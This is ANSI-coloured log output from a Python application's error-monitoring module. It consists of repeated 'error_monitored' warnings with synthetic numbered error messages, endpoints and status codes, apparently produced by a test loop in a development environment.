WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906040Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4058'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906089Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4059'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906138Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4060'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906189Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4061'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906246Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4062'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906294Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4063'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906343Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4064'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906392Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4065'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906441Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4066'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906488Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4067'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906536Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4068'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906584Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4069'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906632Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4070'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906679Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4071'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906726Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4072'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906774Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4073'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906822Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4074'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906869Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4075'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906918Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4076'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.906966Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4077'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907015Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4078'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907063Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4079'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907112Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4080'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907160Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4081'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907208Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4082'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907256Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4083'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907304Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4084'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907380Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4085'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907465Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4086'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907548Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4087'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907631Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4088'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907704Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4089'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907757Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4090'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907809Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4091'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907859Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4092'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907908Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4093'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.907956Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4094'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908006Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4095'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908055Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4096'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908109Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4097'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
